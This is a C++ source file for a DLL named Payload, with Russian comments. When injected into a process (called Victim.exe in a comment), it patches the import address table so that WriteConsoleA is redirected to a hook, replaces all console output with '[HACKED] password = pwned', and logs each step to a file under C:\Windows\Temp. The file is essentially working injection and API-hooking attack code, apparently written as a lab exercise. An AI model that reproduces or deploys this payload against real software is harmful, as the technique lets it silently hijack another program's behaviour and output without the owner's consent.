// Payload.cpp
// MSVC:  cl /LD /EHsc /Fe:Payload.dll Payload.cpp
// MinGW: g++ -shared -o Payload.dll Payload.cpp

#include <windows.h>
#include <cstdio>
#include <cstring>

// ---------- Логирование в файл (чтобы видеть, что происходит) ----------
static void Log(const char* fmt, ...)
{
    FILE* f = nullptr;
    fopen_s(&f, "C:\\Windows\\Temp\\payload.log", "a");
    if (!f) return;

    va_list args;
    va_start(args, fmt);
    vfprintf(f, fmt, args);
    va_end(args);
    fprintf(f, "\n");
    fclose(f);
}

// ---------- Тип оригинальной функции ----------
using WriteConsoleA_t = BOOL(WINAPI*)(HANDLE, LPCVOID, DWORD, LPDWORD, LPVOID);

static WriteConsoleA_t real_WriteConsoleA = nullptr;

// ---------- Наш хук ----------
static BOOL WINAPI HookedWriteConsoleA(HANDLE hOut, LPCVOID /*lpBuffer*/,
                                       DWORD /*nChars*/, LPDWORD lpWritten,
                                       LPVOID reserved)
{
    Log("HookedWriteConsoleA CALLED");

    const char* fake = "[HACKED] password = pwned";
    return real_WriteConsoleA(hOut, fake, (DWORD)strlen(fake), lpWritten, reserved);
}

// ---------- Патч одной записи IAT ----------
// Возвращает true, если запись найдена и заменена.
static bool PatchIat(HMODULE module, const char* importDll, const char* funcName,
                     void* newFunc, void** originalOut)
{
    auto base = (BYTE*)module;

    auto dos = (IMAGE_DOS_HEADER*)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        Log("PatchIat: bad DOS signature");
        return false;
    }

    auto nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        Log("PatchIat: bad NT signature");
        return false;
    }

    DWORD importRva = nt->OptionalHeader
        .DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;

    if (!importRva) {
        Log("PatchIat: no import directory");
        return false;
    }

    auto imp = (IMAGE_IMPORT_DESCRIPTOR*)(base + importRva);

    for (; imp->Name != 0; ++imp)
    {
        const char* dllName = (const char*)(base + imp->Name);
        Log("PatchIat: scanning imports from '%s'", dllName);

        if (_stricmp(dllName, importDll) != 0) continue;

        DWORD thunkRva = imp->FirstThunk;
        DWORD origRva  = imp->OriginalFirstThunk ? imp->OriginalFirstThunk
                                                 : imp->FirstThunk;

        auto orig = (IMAGE_THUNK_DATA*)(base + origRva);
        auto iat  = (IMAGE_THUNK_DATA*)(base + thunkRva);

        for (; orig->u1.AddressOfData != 0; ++orig, ++iat)
        {
            // Пропускаем импорт по ординалу — нам нужно по имени
            if (orig->u1.Ordinal & IMAGE_ORDINAL_FLAG) continue;

            auto ibn = (IMAGE_IMPORT_BY_NAME*)(base + orig->u1.AddressOfData);
            const char* name = (const char*)ibn->Name;

            if (strcmp(name, funcName) != 0) continue;

            Log("PatchIat: FOUND '%s' in IAT at %p (current value %p)",
                name, &iat->u1.Function, (void*)iat->u1.Function);

            if (originalOut) *originalOut = (void*)iat->u1.Function;

            DWORD oldProt = 0;
            if (!VirtualProtect(&iat->u1.Function, sizeof(void*),
                                PAGE_READWRITE, &oldProt)) {
                Log("PatchIat: VirtualProtect failed (%lu)", GetLastError());
                return false;
            }

            iat->u1.Function = (ULONG_PTR)newFunc;

            VirtualProtect(&iat->u1.Function, sizeof(void*),
                           oldProt, &oldProt);

            Log("PatchIat: patched -> %p", newFunc);
            return true;
        }
    }

    Log("PatchIat: '%s' not found in imports of '%s'", funcName, importDll);
    return false;
}

// ---------- Установка хука ----------
static void InstallHook()
{
    Log("InstallHook: start");

    HMODULE victim = GetModuleHandleA(nullptr); // база Victim.exe
    Log("InstallHook: victim base = %p", victim);

    // Пробуем kernel32.dll, потом kernelbase.dll (форвардеры)
    bool ok = PatchIat(victim, "kernel32.dll", "WriteConsoleA",
                       (void*)HookedWriteConsoleA,
                       (void**)&real_WriteConsoleA);

    if (!ok) {
        ok = PatchIat(victim, "kernelbase.dll", "WriteConsoleA",
                      (void*)HookedWriteConsoleA,
                      (void**)&real_WriteConsoleA);
    }

    if (ok) {
        Log("InstallHook: SUCCESS, real=%p, hook=%p",
            (void*)real_WriteConsoleA, (void*)HookedWriteConsoleA);
    } else {
        Log("InstallHook: FAILED");
    }
}

BOOL WINAPI DllMain(HINSTANCE, DWORD reason, LPVOID)
{
    if (reason == DLL_PROCESS_ATTACH) {
        // Логируем сразу — вдруг дальше что-то падает
        Log("========== Payload attached ==========");
        InstallHook();
    }
    return TRUE;
}